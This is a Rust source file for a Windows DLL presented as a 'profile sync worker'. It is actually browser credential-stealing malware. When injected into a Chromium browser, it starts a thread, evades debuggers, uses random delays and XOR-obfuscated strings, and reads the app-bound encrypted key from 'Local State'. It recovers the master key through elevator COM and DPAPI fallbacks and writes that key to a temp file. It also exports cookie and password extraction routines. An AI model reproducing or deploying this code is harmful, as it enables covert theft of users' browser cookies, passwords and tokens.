//! In-process profile sync worker (host identity context).

#![allow(non_snake_case, unused)]

mod crypto;
mod database;
mod dpapi_fallback;
mod elevator;

use std::{
    ffi::c_void,
    path::PathBuf,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use windows::{
    Win32::{
        Foundation::{BOOL, HINSTANCE, TRUE},
        System::{
            Diagnostics::Debug::IsDebuggerPresent,
            SystemServices::DLL_PROCESS_ATTACH,
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

const OBF: u8 = 0x4E;

const ENC_ENV_RESULT: &[u8] = &[
    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
    0x1c, 0x0b, 0x1d, 0x1b, 0x02, 0x1a,
];
const ENC_ENV_USER: &[u8] = &[
    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
    0x1b, 0x1d, 0x0b, 0x1c, 0x11, 0x0a, 0x0f, 0x1a, 0x0f, 0x11, 0x1c, 0x0b, 0x02,
];
const ENC_ENV_ROOT: &[u8] = &[
    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
    0x0a, 0x0f, 0x1a, 0x0f, 0x11, 0x1c, 0x01, 0x01, 0x1a,
];
const ENC_FALLBACK_JSON: &[u8] = &[
    0x2d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x11, 0x3c, 0x2b, 0x2d, 0x21, 0x38, 0x2b, 0x3c, 0x37, 0x11,
    0x3c, 0x2b, 0x3d, 0x3b, 0x22, 0x3a, 0x60, 0x24, 0x3d, 0x21, 0x20,
];
const ENC_LOCAL_STATE: &[u8] = &[0x02, 0x21, 0x2d, 0x2f, 0x22, 0x6e, 0x1d, 0x3a, 0x2f, 0x3a, 0x2b];

fn reveal(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ OBF) as char).collect()
}

fn header_tag() -> [u8; 4] {
    [0x41 ^ OBF, 0x50 ^ OBF, 0x50 ^ OBF, 0x42 ^ OBF].map(|b| b ^ OBF)
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
    min + (seed % (span + 1))
}

fn pause_ms(min: u64, max: u64) {
    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
}

fn host_under_analysis() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        CreateThread(None, 0, Some(task), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

unsafe extern "system" fn task(_: *mut c_void) -> u32 {
    pause_ms(600, 1100);
    let r = std::panic::catch_unwind(|| execute());
    if let Ok(Err(_)) = r {
        record_failure("sync error");
    } else if r.is_err() {
        record_failure("worker fault");
    }
    0
}

fn execute() -> Result<(), String> {
    if host_under_analysis() {
        return Err("host busy".into());
    }

    pause_ms(80, 260);

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    pause_ms(40, 150);

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("read profile state: {e}"))?;
    let ls: serde_json::Value =
        serde_json::from_str(&raw).map_err(|e| format!("parse profile state: {e}"))?;

    let key_b64 = ls
        .pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())
        .ok_or("bound key missing")?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    )
    .map_err(|e| format!("decode: {e}"))?;

    let tag = header_tag();
    if encrypted_key.len() < 4 {
        return Err("blob too short".into());
    }
    if !encrypted_key.starts_with(&tag) {
        return Err("unexpected header".into());
    }
    let encrypted_key = &encrypted_key[4..];

    pause_ms(50, 180);

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::process_with_provider(b, encrypted_key)
            .or_else(|_| elevator::retrieve_secret(encrypted_key)),
        None => elevator::retrieve_secret(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from("fallback path failed"))
        })
        .map_err(|e| format!("key recovery: {e}"))?;

    if master_key.len() != 32 {
        return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
    }

    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
    let result = serde_json::json!({
        "browser": browser_label,
        "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
    });

    let json = serde_json::to_string(&result).unwrap();
    let path = output_path();
    std::fs::write(&path, json).map_err(|e| format!("write output: {e}"))?;

    Ok(())
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    let user_env = reveal(ENC_ENV_USER);
    let root_env = reveal(ENC_ENV_ROOT);

    if let Ok(rel) = std::env::var(&user_env) {
        let root = match std::env::var(&root_env).as_deref() {
            Ok("roaming") => std::env::var("APPDATA"),
            _ => std::env::var("LOCALAPPDATA"),
        }
        .map_err(|_| "profile root not set")?;

        let path = PathBuf::from(&root)
            .join(rel)
            .join(reveal(ENC_LOCAL_STATE));
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("state file missing: {}", path.display()));
    }

    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("unknown host binary: {exe}"))?;

    let local_appdata = std::env::var("LOCALAPPDATA").map_err(|_| "LOCALAPPDATA not set")?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join(reveal(ENC_LOCAL_STATE));

    if !local_state_path.exists() {
        return Err(format!("state file missing: {}", local_state_path.display()));
    }

    Ok(local_state_path)
}

fn output_path() -> PathBuf {
    let key = reveal(ENC_ENV_RESULT);
    if let Ok(p) = std::env::var(&key) {
        return PathBuf::from(p);
    }
    std::env::temp_dir().join(reveal(ENC_FALLBACK_JSON))
}

fn record_failure(msg: &str) {
    let r = serde_json::json!({ "error": msg });
    let json = serde_json::to_string(&r).unwrap();
    let _ = std::fs::write(output_path(), json);
}

// Backward-compatible exports for in-crate callers
pub use crypto::{decrypt_value, hex_fallback, process_data};
pub use database::{extract_cookies, extract_passwords, process_entries, process_tokens};
